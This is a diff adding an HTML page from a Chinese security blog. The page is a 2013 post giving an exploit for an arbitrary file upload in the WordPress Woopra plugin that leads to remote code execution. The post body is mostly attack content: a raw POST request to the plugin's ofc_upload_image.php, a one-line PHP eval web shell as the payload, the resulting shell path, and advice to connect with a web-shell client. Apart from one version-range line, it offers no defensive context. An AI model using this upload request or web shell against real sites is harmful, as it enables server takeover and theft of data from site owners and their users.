@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>WordPress Woopra插件任意文件上传+远程代码执行 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-10-10T20:14:34.000Z" itemprop="datePublished">
+          2013-10-11
+      </time>
+    
+    
+    | 
+    <a href='/tag/Wordpress/'>Wordpress</a>
+    
+    
+</span>
+    <h1 class="post-title">WordPress Woopra插件任意文件上传+远程代码执行</h1>
+    <section class="post-content">
+      <p>照例e文装逼</p>  <p><a href="http://Ha.Cker.In/tag/WordPress" target="_blank">WordPress</a> Woopra Remote Code Execution：<a href="http://www.wordpress-secure.org/index.php/wordpress-woopra-remote-code-execution/" target="_blank" rel="external">http://www.wordpress-secure.org/index.php/wordpress-woopra-remote-code-execution/</a></p>  <p>&#160;</p>  <p>此漏洞对Woopra 1.4.3.1以上版本无效。</p>  <p>插件下载地址：</p>  <p><a title="http://downloads.wordpress.org/plugin/woopra.1.4.3.1.zip" href="http://downloads.wordpress.org/plugin/woopra.1.4.3.1.zip" target="_blank" rel="external">http://downloads.wordpress.org/plugin/woopra.1.4.3.1.zip</a></p>  <p>&#160;</p>  <p>exp发包：</p>  <p>POST /wordpress/3.5.1_CN/wp-content/plugins/woopra/inc/php-ofc-library/ofc_upload_image.php?name=11.php HTTP/1.1   <br>Host: ha.cker.in    <br>Proxy-Connection: keep-alive    <br>Cache-Control: max-age=0    <br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8    <br>User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36    <br>Accept-Encoding: gzip,deflate,sdch    <br>Accept-Language: zh-CN,zh;q=0.8    <br>Content-Length: 28 </p>  <p>&lt;?php eval($_POST[‘cmd’]); ?&gt;</p>  <p>&#160;</p>  <p>上传的文件在<a title="http://ha.cker.in/wordpress/3.5.1_CN/wp-content/plugins/woopra/inc/tmp-upload-images/11.php" href="http://ha.cker.in/wordpress/3.5.1_CN/wp-content/plugins/woopra/inc/tmp-upload-images/11.php">http://ha.cker.in/wordpress/3.5.1_CN/wp-content/plugins/woopra/inc/tmp-upload-images/11.php</a></p>  <p><a href="http://img.cker.in/WordPressWoopra_AC1A/image.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="141" alt="image" src="http://img.cker.in/WordPressWoopra_AC1A/image_thumb.png" width="726" border="0"></a> </p>  <p>菜刀连接就ok了。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1034.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1034.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1034.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1034.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1035.seo/">
+        ← 转载 我是如何在谷歌财经发现一个XSS漏洞，并且拿到了5千美元奖励
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1033.seo/">
+        tipask问答系统2.0 ajaxsearch二次编码注入漏洞 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
